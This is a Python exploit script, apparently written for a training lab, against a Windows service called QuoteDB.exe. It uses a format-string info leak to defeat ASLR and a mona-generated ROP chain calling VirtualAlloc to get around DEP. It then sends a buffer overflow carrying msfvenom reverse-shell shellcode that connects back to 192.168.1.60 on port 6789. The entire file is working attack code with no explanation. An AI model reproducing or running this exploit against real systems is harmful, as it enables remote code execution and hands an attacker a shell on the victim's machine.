import struct
import socket


TARGET_IP = "127.0.0.1"
TARGET_PORT = 3700
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN_EIP = 3000  # change me

#FIRST INFO LEAK - 902
opcode = struct.pack("<I",0x386)
payload = opcode
payload += b"%p" * CRASH_LEN_EIP

with socket.create_connection(target) as sock:
    sent = sock.send(payload)
    resp = sock.recv(512)
    print(f"sent {sent} bytes")
    sock.close()

#SECOND - INFO LEAK - 901
opcode = struct.pack("<I",0x385)
payload = opcode
payload += struct.pack("<I",0xa) #num quotes

with socket.create_connection(target) as sock:
    sent = sock.send(payload)
    resp = sock.recv(512)

resp = [resp[i:i+8] for i in range(0, len(resp), 8)]
#75bb0000 75c6f000   msvcrt 
msvcrt_base = hex(int("0x" + resp[0].decode("utf-8"),16) - 0x66bc0)
#print("msvcrt: "+msvcrt_base)
#00580000 005d2000   main (QuoteDB.exe)
quotedb_base = hex(int("0x" + resp[2].decode("utf-8"),16) - 0x173b)
print("QuoteDB base: "+quotedb_base)
virtual_alloc = hex(int(quotedb_base,16) + 0x43218)
print("VirtualAlloc poi: " + virtual_alloc)

msvcrt_base = int("0x" + resp[0].decode("utf-8"),16) - 0x66bc0
virtual_alloc = int(quotedb_base,16) + 0x43218

#THIRD - EXPLOIT
rop_nop = struct.pack("<I",msvcrt_base + 0x00004e50) # RET from msvcrt

#mona generated
#[---INFO:gadgets_to_set_ebp:---]
rop = struct.pack("<I",msvcrt_base + 0x0007651a)  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I",msvcrt_base + 0x0007651a)   # skip 4 bytes [msvcrt.dll] ** REBASED ** ASLR
#[---INFO:gadgets_to_set_ebx:---]
rop += struct.pack("<I",msvcrt_base + 0x00098a9a)  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I", 0xfbdbbb24)  # put delta into eax (-> put 0x00000001 into ebx)
rop += struct.pack("<I",msvcrt_base + 0x0009f669)  # ADD EAX,42444DD # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I",msvcrt_base + 0x00089319)  # XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR 
#[---INFO:gadgets_to_set_edx:---]
rop += struct.pack("<I",msvcrt_base +  0x00098d52)  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I", 0xfbdbcb23)  # put delta into eax (-> put 0x00001000 into edx)
rop += struct.pack("<I",msvcrt_base + 0x0009f669)  # ADD EAX,42444DD # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I",msvcrt_base + 0x00089275)  # XCHG EAX,EDX # RETN [msvcrt.dll] ** REBASED ** ASLR 
#[---INFO:gadgets_to_set_ecx:---]
rop += struct.pack("<I",msvcrt_base + 0x0009cf91)  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I", 0xfbdbbb63)  # put delta into eax (-> put 0x00000040 into ecx)
rop += struct.pack("<I",msvcrt_base + 0x0009f669)  # ADD EAX,42444DD # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I",msvcrt_base + 0x00089195)  # XCHG EAX,ECX # RETN [msvcrt.dll] ** REBASED ** ASLR 
#[---INFO:gadgets_to_set_edi:---]
rop += struct.pack("<I",msvcrt_base + 0x000899b3)  # POP EDI # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += rop_nop
#[---INFO:gadgets_to_set_esi:---]
rop += struct.pack("<I",msvcrt_base + 0x00066f6d)  # POP ESI # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I",msvcrt_base + 0x0000d178)  # JMP [EAX] [msvcrt.dll]
rop += struct.pack("<I",msvcrt_base + 0x0009cf91)  # POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR 
rop += struct.pack("<I",virtual_alloc)  # ptr to &VirtualAlloc() [IAT msvcrt.dll] ** REBASED ** ASLR
#[---INFO:pushad:---]
rop += struct.pack("<I",msvcrt_base + 0x00056f67)  # PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR 
#[---INFO:extras:---]
rop += struct.pack("<I",msvcrt_base + 0x0000801d)  # ptr to 'call esp' [msvcrt.dll] ** REBASED ** ASLR

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.60 LPORT=6789  -f python -v shellcode -b '\x00' EXITFUNC=thread
shellcode =  b""
shellcode += b"\xb8\x7c\x42\xca\xfa\xdb\xda\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e"
shellcode += b"\x03\x3f\x4c\x28\x0f\x43\xb8\x2e\xf0\xbb\x39"
shellcode += b"\x4f\x78\x5e\x08\x4f\x1e\x2b\x3b\x7f\x54\x79"
shellcode += b"\xb0\xf4\x38\x69\x43\x78\x95\x9e\xe4\x37\xc3"
shellcode += b"\x91\xf5\x64\x37\xb0\x75\x77\x64\x12\x47\xb8"
shellcode += b"\x79\x53\x80\xa5\x70\x01\x59\xa1\x27\xb5\xee"
shellcode += b"\xff\xfb\x3e\xbc\xee\x7b\xa3\x75\x10\xad\x72"
shellcode += b"\x0d\x4b\x6d\x75\xc2\xe7\x24\x6d\x07\xcd\xff"
shellcode += b"\x06\xf3\xb9\x01\xce\xcd\x42\xad\x2f\xe2\xb0"
shellcode += b"\xaf\x68\xc5\x2a\xda\x80\x35\xd6\xdd\x57\x47"
shellcode += b"\x0c\x6b\x43\xef\xc7\xcb\xaf\x11\x0b\x8d\x24"
shellcode += b"\x1d\xe0\xd9\x62\x02\xf7\x0e\x19\x3e\x7c\xb1"
shellcode += b"\xcd\xb6\xc6\x96\xc9\x93\x9d\xb7\x48\x7e\x73"
shellcode += b"\xc7\x8a\x21\x2c\x6d\xc1\xcc\x39\x1c\x88\x98"
shellcode += b"\x8e\x2d\x32\x59\x99\x26\x41\x6b\x06\x9d\xcd"
shellcode += b"\xc7\xcf\x3b\x0a\x27\xfa\xfc\x84\xd6\x05\xfd"
shellcode += b"\x8d\x1c\x51\xad\xa5\xb5\xda\x26\x35\x39\x0f"
shellcode += b"\xe8\x65\x95\xe0\x49\xd5\x55\x51\x22\x3f\x5a"
shellcode += b"\x8e\x52\x40\xb0\xa7\xf9\xbb\x53\x08\x55\xc2"
shellcode += b"\x9f\xe0\xa4\xc4\xc5\x75\x21\x22\x93\x65\x64"
shellcode += b"\xfd\x0c\x1f\x2d\x75\xac\xe0\xfb\xf0\xee\x6b"
shellcode += b"\x08\x05\xa0\x9b\x65\x15\x55\x6c\x30\x47\xf0"
shellcode += b"\x73\xee\xef\x9e\xe6\x75\xef\xe9\x1a\x22\xb8"
shellcode += b"\xbe\xed\x3b\x2c\x53\x57\x92\x52\xae\x01\xdd"
shellcode += b"\xd6\x75\xf2\xe0\xd7\xf8\x4e\xc7\xc7\xc4\x4f"
shellcode += b"\x43\xb3\x98\x19\x1d\x6d\x5f\xf0\xef\xc7\x09"
shellcode += b"\xaf\xb9\x8f\xcc\x83\x79\xc9\xd0\xc9\x0f\x35"
shellcode += b"\x60\xa4\x49\x4a\x4d\x20\x5e\x33\xb3\xd0\xa1"
shellcode += b"\xee\x77\xf0\x43\x3a\x82\x99\xdd\xaf\x2f\xc4"
shellcode += b"\xdd\x1a\x73\xf1\x5d\xae\x0c\x06\x7d\xdb\x09"
shellcode += b"\x42\x39\x30\x60\xdb\xac\x36\xd7\xdc\xe4"

OFFSET = 2064
payload = b"A"*OFFSET
payload += rop_nop
payload += rop
payload += b"\x90"*10
payload += shellcode
payload += b"C" * (CRASH_LEN_EIP - len(payload))

with socket.create_connection(target) as sock:
    sent = sock.send(payload)
    resp = sock.recv(512)
    #print(resp)
sock.close()
